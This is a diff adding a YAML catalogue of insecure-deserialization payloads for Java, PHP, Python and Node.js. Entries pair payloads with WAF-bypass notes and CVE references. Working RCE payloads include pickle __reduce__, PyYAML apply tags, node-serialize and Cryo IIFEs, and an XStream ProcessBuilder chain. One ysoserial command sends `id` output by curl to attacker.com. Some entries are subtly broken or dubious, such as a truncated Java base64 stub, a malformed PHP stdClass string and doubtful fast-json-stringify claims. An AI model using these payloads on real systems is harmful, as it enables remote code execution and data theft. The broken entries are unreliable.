@@ -1,0 +1,534 @@
+slug: deserialization
+name: "Insecure Deserialization"
+owasp: "A08:2021 – Software and Data Integrity Failures"
+description: >
+  Insecure deserialization occurs when an application deserializes data from untrusted sources
+  without proper validation, allowing attackers to manipulate serialized objects to achieve
+  remote code execution, privilege escalation, or denial of service. Languages like Java, PHP,
+  Python, and Node.js all have known gadget chains that can be leveraged once deserialization
+  is triggered.
+severity_range:
+  low: "CVSS 7.0 – object manipulation, privilege escalation"
+  high: "CVSS 9.8 – remote code execution via gadget chains"
+references:
+  - label: "OWASP Deserialization Cheat Sheet"
+    url: "https://cheatsheetseries.owasp.org/cheatsheets/Deserialization_Cheat_Sheet.html"
+  - label: "PortSwigger Insecure Deserialization"
+    url: "https://portswigger.net/web-security/deserialization"
+
+groups:
+  - slug: java-deserialization
+    name: "Java Deserialization"
+    description: "Exploiting Java's ObjectInputStream with known gadget chains (Commons Collections, Spring, etc.)"
+    difficulty: expert
+    prerequisites:
+      - "Java application deserializes untrusted data via ObjectInputStream"
+      - "Vulnerable gadget chain library on classpath"
+    payloads:
+      - id: "deser-java-001"
+        title: "ysoserial Commons Collections 1 RCE"
+        payload_string: "rO0ABXNyADJzdW4ucmVmbGVjdC5hbm5vdGF0aW9uLkFubm90YXRpb25JbnZvY2F0aW9uSGFuZGxlclXK9Q8Vy36lAgACTAAMbWVtYmVyVmFsdWVzdAAPTGphdmEvdXRpbC9NYXA7TAAEdHlwZXQAEUxqYXZhL2xhbmcvQ2xhc3M7eHA="
+        how_it_works: >
+          This Base64-encoded Java serialized payload leverages the Commons Collections 1 gadget chain.
+          When deserialized by ObjectInputStream, the gadget chain triggers a series of method calls
+          through reflection proxies that ultimately invoke Runtime.exec() with an attacker-controlled
+          command. The AnnotationInvocationHandler proxy wraps a Map whose get() call triggers the chain.
+          An attacker generates this payload with ysoserial and sends it wherever the application
+          deserializes untrusted bytes (HTTP body, cookie, parameter).
+        prerequisites:
+          - "Commons Collections 3.1 or 3.2.1 on classpath"
+          - "Application uses ObjectInputStream.readObject() on attacker-controlled data"
+        waf_bypass_notes: "Payload is binary; some WAFs miss binary content. Try chunked encoding or multipart upload."
+        severity_context: "CVSS 9.8 – direct RCE on the server running the Java application"
+        cve_refs:
+          - "CVE-2015-4852"
+          - "CVE-2015-7501"
+        tags:
+          - "java"
+          - "rce"
+          - "gadget-chain"
+          - "commons-collections"
+        date_added: "2024-01-01"
+        last_updated: "2024-01-01"
+      - id: "deser-java-002"
+        title: "ysoserial Spring1 RCE"
+        payload_string: "# Generate: java -jar ysoserial.jar Spring1 'curl attacker.com/$(id)'"
+        how_it_works: >
+          The Spring1 gadget chain exploits Spring Framework's ObjectFactoryDelegatingInvocationHandler
+          class. When deserialized, it triggers a method lookup that eventually calls the target command
+          through Spring's bean factory mechanism. This chain works when Spring Framework classes are
+          available but Commons Collections is not. The payload is generated via ysoserial and submitted
+          as the deserialized object. Successful exploitation gives code execution as the application's
+          process user.
+        prerequisites:
+          - "Spring Framework on classpath"
+          - "Vulnerable deserialization endpoint"
+        waf_bypass_notes: "Encode as gzip+base64 to evade content inspection"
+        severity_context: "CVSS 9.8 – RCE; impact depends on JVM user privileges"
+        cve_refs: []
+        tags:
+          - "java"
+          - "rce"
+          - "spring"
+          - "gadget-chain"
+        date_added: "2024-01-01"
+        last_updated: "2024-01-01"
+      - id: "deser-java-003"
+        title: "ysoserial Groovy1 RCE"
+        payload_string: "# Generate: java -jar ysoserial.jar Groovy1 'id > /tmp/pwned'"
+        how_it_works: >
+          The Groovy1 gadget chain exploits Groovy's ConvertedClosure class, which implements
+          InvocationHandler. When placed in a Map and the Map is accessed during deserialization,
+          the ConvertedClosure proxy triggers Groovy's method dispatch, which can be directed
+          to execute arbitrary system commands through GroovyObject's invokeMethod. This chain
+          requires Groovy on the classpath (common in Grails or Jenkins environments).
+        prerequisites:
+          - "Groovy on classpath (≥1.7.0)"
+          - "ObjectInputStream deserialization of attacker data"
+        waf_bypass_notes: "Base64 encode and send in custom header or cookie"
+        severity_context: "CVSS 9.8 – RCE; common in Jenkins and Grails applications"
+        cve_refs:
+          - "CVE-2016-2510"
+        tags:
+          - "java"
+          - "rce"
+          - "groovy"
+          - "gadget-chain"
+        date_added: "2024-01-01"
+        last_updated: "2024-01-01"
+      - id: "deser-java-004"
+        title: "JRMP redirect deserialization"
+        payload_string: "# Generate: java -cp ysoserial.jar ysoserial.exploit.JRMPListener 1099 CommonsCollections1 'cmd'"
+        how_it_works: >
+          This technique exploits Java's RMI/JRMP protocol by causing the target JVM to connect
+          back to an attacker-controlled JRMP listener during deserialization. The payload contains
+          a remote reference that triggers outbound RMI communication, allowing the attacker to
+          deliver a gadget-chain payload at deserialization time rather than embedding it in the
+          initial request. This bypasses some content-length and signature checks on the serialized stream.
+        prerequisites:
+          - "Outbound TCP connections from target to attacker allowed"
+          - "Java RMI or similar JRMP-aware deserialization"
+        waf_bypass_notes: "Splits the gadget chain delivery into two phases, bypassing payload size limits"
+        severity_context: "CVSS 9.0 – RCE with network egress requirement"
+        cve_refs:
+          - "CVE-2017-3241"
+        tags:
+          - "java"
+          - "rce"
+          - "jrmp"
+          - "oob"
+        date_added: "2024-01-01"
+        last_updated: "2024-01-01"
+      - id: "deser-java-005"
+        title: "XStream XXE/RCE via processAnnotations"
+        payload_string: |
+          <sorted-set>
+            <string>foo</string>
+            <dynamic-proxy>
+              <interface>java.lang.Comparable</interface>
+              <handler class="java.beans.EventHandler">
+                <target class="java.lang.ProcessBuilder">
+                  <command><string>id</string></command>
+                </target>
+                <action>start</action>
+              </handler>
+            </dynamic-proxy>
+          </sorted-set>
+        how_it_works: >
+          XStream's XML deserialization does not restrict class loading by default. By crafting XML
+          that references java.beans.EventHandler wrapping a ProcessBuilder, an attacker can trigger
+          code execution when XStream processes the XML. The EventHandler is a legitimate JDK class
+          that bridges JavaBeans events to method calls, here redirected to ProcessBuilder.start().
+          This was heavily exploited in Jenkins and other XStream-using applications.
+        prerequisites:
+          - "Application uses XStream to deserialize XML from user input"
+          - "XStream version < 1.4.7 or missing SecurityManager configuration"
+        waf_bypass_notes: "Encode XML content, use CDATA sections, or split across multipart chunks"
+        severity_context: "CVSS 9.8 – RCE; widely exploited in Jenkins, REST APIs using XStream"
+        cve_refs:
+          - "CVE-2013-7285"
+          - "CVE-2021-21351"
+        tags:
+          - "java"
+          - "xstream"
+          - "rce"
+          - "xml"
+        date_added: "2024-01-01"
+        last_updated: "2024-01-01"
+
+  - slug: php-deserialization
+    name: "PHP Object Injection"
+    description: "Exploiting PHP's unserialize() with magic methods (__destruct, __wakeup, __toString) to achieve code execution or file write"
+    difficulty: high
+    prerequisites:
+      - "Application calls unserialize() on attacker-controlled data"
+      - "Autoloaded classes with exploitable magic methods available"
+    payloads:
+      - id: "deser-php-001"
+        title: "PHP magic method __destruct file write"
+        payload_string: 'O:8:"stdClass":1:{s:4:"file";s:16:"/var/www/html/x.php";}'
+        how_it_works: >
+          PHP's unserialize() will instantiate any class whose definition is loaded and call __wakeup()
+          and __destruct() automatically. By crafting an object of a class that writes to disk in
+          __destruct (e.g., a Monolog FileHandler or similar), an attacker can create arbitrary files.
+          The attack requires identifying classes in the application's autoloading chain with dangerous
+          magic methods. Tools like phpggc automate gadget chain discovery for popular frameworks.
+        prerequisites:
+          - "unserialize() called on user input"
+          - "Monolog, Symfony, or similar framework with file-writing magic methods in autoload"
+        waf_bypass_notes: "URL encode the payload; try lowercase 'o:' notation to bypass naive filters"
+        severity_context: "CVSS 9.0 – arbitrary file write, webshell upload, RCE"
+        cve_refs: []
+        tags:
+          - "php"
+          - "object-injection"
+          - "file-write"
+          - "magic-method"
+        date_added: "2024-01-01"
+        last_updated: "2024-01-01"
+      - id: "deser-php-002"
+        title: "phpggc Symfony RCE chain"
+        payload_string: "# Generate: phpggc Symfony/RCE7 system 'id' -b"
+        how_it_works: >
+          phpggc (PHP Generic Gadget Chains) generates exploitation payloads for PHP deserialization
+          targeting popular frameworks. The Symfony/RCE7 chain exploits Symfony's Validator component
+          via a chain through ValidatorBuilder, which reaches system() or similar. The -b flag
+          produces a Base64-encoded payload safe for HTTP transmission. Successful exploitation
+          executes OS commands as the web server user.
+        prerequisites:
+          - "Symfony Framework 2.x-5.x with Validator component"
+          - "unserialize() on attacker-controlled data"
+        waf_bypass_notes: "Use Base64 + URL encoding; split payload across multiple parameters"
+        severity_context: "CVSS 9.8 – RCE in Symfony applications"
+        cve_refs: []
+        tags:
+          - "php"
+          - "symfony"
+          - "rce"
+          - "phpggc"
+        date_added: "2024-01-01"
+        last_updated: "2024-01-01"
+      - id: "deser-php-003"
+        title: "PHP session deserialization via session.serialize_handler"
+        payload_string: "|O:8:\"stdClass\":0:{}"
+        how_it_works: >
+          PHP supports multiple session serialization handlers (php, php_binary, php_serialize).
+          When the application uses php_serialize for writing but php for reading (or vice versa),
+          an attacker can inject a pipe character | followed by a serialized object into session data.
+          The php handler treats everything after | as a new serialized value, allowing object
+          injection via session uploads or session ID manipulation. No direct unserialize() call
+          is needed.
+        prerequisites:
+          - "Mismatched session.serialize_handler between write and read paths"
+          - "Attacker can control session cookie content or file upload affecting session"
+        waf_bypass_notes: "Session cookies are typically not inspected by WAFs"
+        severity_context: "CVSS 8.1 – object injection leading to potential RCE"
+        cve_refs: []
+        tags:
+          - "php"
+          - "session"
+          - "object-injection"
+          - "second-order"
+        date_added: "2024-01-01"
+        last_updated: "2024-01-01"
+      - id: "deser-php-004"
+        title: "PHAR deserialization metadata injection"
+        payload_string: "# Create PHAR: php create_phar.php; upload phar file, access via phar://path/to/file"
+        how_it_works: >
+          PHP PHAR archives embed serialized metadata that is automatically deserialized when
+          any filesystem function (file_exists, file_get_contents, fopen, etc.) accesses a
+          phar:// stream wrapper path. An attacker who can upload a file and trigger any
+          filesystem operation on it using a phar:// URL achieves PHP object injection without
+          any explicit unserialize() in the code. This technique bypasses file-type checks
+          because the malicious PHAR can have any extension.
+        prerequisites:
+          - "Application allows file uploads"
+          - "Filesystem functions accept user-controlled paths including phar://"
+        waf_bypass_notes: "Rename PHAR to .jpg or .gif; WAFs inspect extension not content"
+        severity_context: "CVSS 9.0 – object injection without explicit unserialize(), leading to RCE"
+        cve_refs: []
+        tags:
+          - "php"
+          - "phar"
+          - "object-injection"
+          - "file-upload"
+        date_added: "2024-01-01"
+        last_updated: "2024-01-01"
+      - id: "deser-php-005"
+        title: "PHP __toString chain for SQL injection"
+        payload_string: 'O:10:"Collection":1:{s:5:"items";a:1:{i:0;O:4:"User":1:{s:2:"id";s:8:"1 OR 1=1";}}}'
+        how_it_works: >
+          When a serialized object is used in a string context (echo, concatenation, SQL query),
+          PHP automatically calls __toString(). By crafting an object whose __toString() returns
+          attacker-controlled SQL, the deserialization triggers an SQL injection via the magic
+          method. This is a cross-vulnerability chain combining deserialization with SQL injection
+          and requires understanding both the class hierarchy and how objects are used after
+          deserialization.
+        prerequisites:
+          - "unserialize() on user input"
+          - "Deserialized object used directly in SQL query context"
+        waf_bypass_notes: "The SQL injection payload is inside the serialized structure, bypassing input filters"
+        severity_context: "CVSS 9.1 – SQL injection triggered via deserialization, bypassing direct input validation"
+        cve_refs: []
+        tags:
+          - "php"
+          - "object-injection"
+          - "sqli"
+          - "tostring"
+          - "chained"
+        date_added: "2024-01-01"
+        last_updated: "2024-01-01"
+
+  - slug: python-deserialization
+    name: "Python Pickle / PyYAML Deserialization"
+    description: "Exploiting Python's pickle, yaml.load(), or marshal for arbitrary code execution during deserialization"
+    difficulty: high
+    prerequisites:
+      - "Application uses pickle.loads() or yaml.load() on untrusted input"
+      - "No safe_load() restriction in place"
+    payloads:
+      - id: "deser-py-001"
+        title: "Python pickle RCE via __reduce__"
+        payload_string: |
+          import pickle, os, base64
+          class Exploit(object):
+              def __reduce__(self):
+                  return (os.system, ('id > /tmp/pwned',))
+          payload = base64.b64encode(pickle.dumps(Exploit()))
+        how_it_works: >
+          Python's pickle protocol calls __reduce__ on objects during pickling to determine how
+          to reconstruct them. By defining __reduce__ to return a callable and its arguments,
+          an attacker causes arbitrary code execution during unpickling. pickle.loads() on
+          attacker-controlled data calls the specified callable (here os.system) with the
+          provided arguments. This requires no gadget chain—pickle is inherently unsafe for
+          untrusted data. The payload is Base64-encoded and submitted to endpoints that pickle.loads().
+        prerequisites:
+          - "Application calls pickle.loads() on user-supplied data"
+        waf_bypass_notes: "Encode with base64, gzip, or both; WAFs rarely inspect binary pickle streams"
+        severity_context: "CVSS 9.8 – immediate RCE; pickle is always dangerous on untrusted data"
+        cve_refs: []
+        tags:
+          - "python"
+          - "pickle"
+          - "rce"
+          - "reduce"
+        date_added: "2024-01-01"
+        last_updated: "2024-01-01"
+      - id: "deser-py-002"
+        title: "PyYAML yaml.load() RCE via Python object tag"
+        payload_string: "!!python/object/apply:os.system ['id']"
+        how_it_works: >
+          PyYAML's yaml.load() (without Loader=yaml.SafeLoader) supports YAML tags that
+          instantiate arbitrary Python objects. The !!python/object/apply: tag calls any
+          Python callable with supplied arguments. By passing yaml.load('!!python/object/apply:os.system [\"id\"]'),
+          the YAML parser executes os.system("id"). This is a one-liner attack that requires
+          only that the application uses yaml.load() instead of yaml.safe_load(). Very common
+          in Python configuration file parsing and API endpoints.
+        prerequisites:
+          - "Application calls yaml.load() without SafeLoader on user input"
+          - "PyYAML version < 5.1 (or >= 5.1 without Loader= specified)"
+        waf_bypass_notes: "Newlines in YAML can split the tag across lines; hexadecimal escape sequences also work"
+        severity_context: "CVSS 9.8 – one-liner RCE; extremely common misconfiguration"
+        cve_refs:
+          - "CVE-2017-18342"
+        tags:
+          - "python"
+          - "yaml"
+          - "rce"
+          - "pyyaml"
+        date_added: "2024-01-01"
+        last_updated: "2024-01-01"
+      - id: "deser-py-003"
+        title: "Python marshal code execution"
+        payload_string: "import marshal, base64; marshal.loads(base64.b64decode('<marshal_code_object>'))"
+        how_it_works: >
+          Python's marshal module serializes code objects (bytecode). If an application calls
+          marshal.loads() on attacker-controlled data (rare but occurs in plugin loaders and
+          template caches), an attacker can supply a crafted code object that executes arbitrary
+          bytecode. Unlike pickle, marshal has no __reduce__ hook—it directly deserializes
+          compiled Python bytecode, giving complete control over the execution flow.
+        prerequisites:
+          - "Application uses marshal.loads() on attacker-controlled data"
+          - "Python bytecode version must match target Python version"
+        waf_bypass_notes: "Binary format; not typically inspected by WAFs"
+        severity_context: "CVSS 9.8 – RCE via bytecode execution; rarer but undefendable once triggered"
+        cve_refs: []
+        tags:
+          - "python"
+          - "marshal"
+          - "rce"
+          - "bytecode"
+        date_added: "2024-01-01"
+        last_updated: "2024-01-01"
+      - id: "deser-py-004"
+        title: "Celery task deserialization via pickle backend"
+        payload_string: "# Send crafted pickle payload to Celery task queue (RabbitMQ/Redis)"
+        how_it_works: >
+          Celery's default serializer was historically pickle, meaning task arguments and
+          results were pickled. An attacker with write access to the Celery broker (Redis,
+          RabbitMQ) can inject a malicious pickle payload as a task message. When the Celery
+          worker dequeues and deserializes the task, code execution occurs with worker process
+          privileges. Modern Celery defaults to JSON, but older configurations remain vulnerable.
+        prerequisites:
+          - "Celery configured with CELERY_TASK_SERIALIZER='pickle'"
+          - "Attacker has write access to the message broker"
+        waf_bypass_notes: "Internal queue; WAF typically not in path"
+        severity_context: "CVSS 9.0 – RCE on Celery worker processes; common in Django/Flask deployments"
+        cve_refs:
+          - "CVE-2021-23727"
+        tags:
+          - "python"
+          - "pickle"
+          - "celery"
+          - "rce"
+          - "message-queue"
+        date_added: "2024-01-01"
+        last_updated: "2024-01-01"
+      - id: "deser-py-005"
+        title: "Python jsonpickle deserialization RCE"
+        payload_string: '{"py/reduce": [{"py/function": "os.system"}, {"py/tuple": ["id"]}]}'
+        how_it_works: >
+          jsonpickle is a Python library that extends JSON to support Python object serialization.
+          Unlike standard json.loads(), jsonpickle recognizes special keys like py/reduce,
+          py/function, and py/tuple to reconstruct Python objects. An attacker can craft a
+          JSON payload using py/reduce to call os.system() or subprocess.Popen() with
+          arbitrary arguments. If an application uses jsonpickle.decode() on untrusted input,
+          this results in RCE. The JSON format makes this easier to inject than binary pickle.
+        prerequisites:
+          - "Application uses jsonpickle.decode() on attacker-controlled JSON"
+        waf_bypass_notes: "Appears as normal JSON; WAFs may not flag jsonpickle-specific keys"
+        severity_context: "CVSS 9.8 – RCE via JSON-encoded pickle semantics"
+        cve_refs: []
+        tags:
+          - "python"
+          - "jsonpickle"
+          - "rce"
+          - "json"
+        date_added: "2024-01-01"
+        last_updated: "2024-01-01"
+
+  - slug: node-deserialization
+    name: "Node.js Deserialization (node-serialize)"
+    description: "Exploiting node-serialize and similar npm packages for IIFE-based code execution during deserialization"
+    difficulty: high
+    prerequisites:
+      - "Application uses node-serialize or similar package on user data"
+    payloads:
+      - id: "deser-node-001"
+        title: "node-serialize IIFE RCE"
+        payload_string: "{\"rce\":\"_$$ND_FUNC$$_function(){require('child_process').exec('id',function(e,r){console.log(r)});}()\"}"
+        how_it_works: >
+          The node-serialize npm package (pre-0.0.4) evaluates JavaScript function strings
+          prefixed with _$$ND_FUNC$$_. If the function string ends with () making it an
+          Immediately Invoked Function Expression (IIFE), it executes upon deserialization.
+          By injecting a function that calls require('child_process').exec(), an attacker
+          achieves OS command execution. This vulnerability is a well-known example of
+          unsafe eval()-based deserialization in the Node.js ecosystem.
+        prerequisites:
+          - "Application uses node-serialize < 0.0.4"
+          - "Serialized data comes from cookie, JWT payload, or request body"
+        waf_bypass_notes: "Unicode escape sequences and template literals can obfuscate the payload"
+        severity_context: "CVSS 9.8 – RCE; common in Express.js apps using cookie-based session deserialization"
+        cve_refs:
+          - "CVE-2017-5941"
+        tags:
+          - "nodejs"
+          - "rce"
+          - "iife"
+          - "eval"
+          - "node-serialize"
+        date_added: "2024-01-01"
+        last_updated: "2024-01-01"
+      - id: "deser-node-002"
+        title: "JavaScript prototype pollution via JSON.parse gadget"
+        payload_string: '{"__proto__":{"isAdmin":true}}'
+        how_it_works: >
+          While JSON.parse itself doesn't execute code, parsing attacker-controlled JSON
+          that contains __proto__ keys can pollute JavaScript's Object prototype when
+          the parsed data is merged into objects using insecure patterns like
+          Object.assign(target, JSON.parse(input)) or deep merge libraries. This can
+          lead to privilege escalation, DoS, or RCE depending on gadgets in the
+          application. It is a form of logic-level deserialization attack.
+        prerequisites:
+          - "Application merges parsed JSON into objects without prototype protection"
+          - "Vulnerable deep-merge or extend library"
+        waf_bypass_notes: "Appears as normal JSON structure; __proto__ key not typically filtered"
+        severity_context: "CVSS 7.5 – privilege escalation, potential RCE via prototype chain gadgets"
+        cve_refs: []
+        tags:
+          - "nodejs"
+          - "prototype-pollution"
+          - "json"
+          - "privilege-escalation"
+        date_added: "2024-01-01"
+        last_updated: "2024-01-01"
+      - id: "deser-node-003"
+        title: "Cryo.js deserialization RCE"
+        payload_string: >-
+          {"root":"_CRYO_REF_0","references":[{"contents":{"type":"_CRYO_FUNCTION_","value":"(function(){require('child_process').execSync('id > /tmp/x')})()"},"path":""}]}
+        how_it_works: >
+          Cryo.js is an npm package for advanced JavaScript serialization. Like node-serialize,
+          it supports function serialization via eval(). By crafting a Cryo JSON payload with
+          a _CRYO_FUNCTION_ type containing an IIFE, an attacker causes code execution when
+          Cryo.parse() processes the input. The function value is passed to eval() with
+          immediate invocation, executing arbitrary Node.js code with application server privileges.
+        prerequisites:
+          - "Application uses Cryo.parse() on attacker-controlled data"
+        waf_bypass_notes: "Obfuscate function contents using String.fromCharCode() or hex escapes"
+        severity_context: "CVSS 9.8 – RCE in applications using Cryo for session or state serialization"
+        cve_refs: []
+        tags:
+          - "nodejs"
+          - "cryo"
+          - "rce"
+          - "eval"
+          - "function-serialization"
+        date_added: "2024-01-01"
+        last_updated: "2024-01-01"
+      - id: "deser-node-004"
+        title: "Loopback juggling via __defineGetter__ pollution"
+        payload_string: '{"__defineGetter__":{"isAdmin":"_$$ND_FUNC$$_function(){return true;}"}}'
+        how_it_works: >
+          In older JavaScript engines and Node.js versions, __defineGetter__ can be used as
+          a prototype pollution vector when attacker-controlled objects are merged into
+          application objects. Combined with node-serialize's function deserialization,
+          this allows property getter hijacking. When application code checks obj.isAdmin,
+          the attacker's function is called instead, returning true and bypassing authorization.
+          This technique requires both a merge operation and deserialization in the same code path.
+        prerequisites:
+          - "Node.js with legacy __defineGetter__ support"
+          - "Insecure merge of deserialized object into authorization check target"
+        waf_bypass_notes: "Non-standard JSON keys; some WAFs block __proto__ but not __defineGetter__"
+        severity_context: "CVSS 8.8 – auth bypass and potential RCE via combined prototype/deserialization attack"
+        cve_refs: []
+        tags:
+          - "nodejs"
+          - "prototype-pollution"
+          - "auth-bypass"
+          - "getter-hijack"
+        date_added: "2024-01-01"
+        last_updated: "2024-01-01"
+      - id: "deser-node-005"
+        title: "fast-json-stringify type confusion for privilege escalation"
+        payload_string: '{"role":"admin","__proto__":{"role":"admin"}}'
+        how_it_works: >
+          fast-json-stringify and similar high-performance JSON serializers may have type
+          confusion bugs where prototype-polluted properties override schema-validated fields.
+          By sending a JSON body that both sets a user-controlled field normally and pollutes
+          the prototype with the same field set to a privileged value, an attacker may bypass
+          schema validation because the serializer reads from the polluted prototype rather
+          than the instance property. This bypasses server-side validation that expects a
+          specific value type.
+        prerequisites:
+          - "Application uses fast-json-stringify or ajv for validation/serialization"
+          - "Insecure merge of request body into user object"
+        waf_bypass_notes: "Encoded as standard JSON; not distinguishable by WAF without deep inspection"
+        severity_context: "CVSS 8.8 – privilege escalation, potential account takeover"
+        cve_refs: []
+        tags:
+          - "nodejs"
+          - "type-confusion"
+          - "privilege-escalation"
+          - "json"
+        date_added: "2024-01-01"
+        last_updated: "2024-01-01"
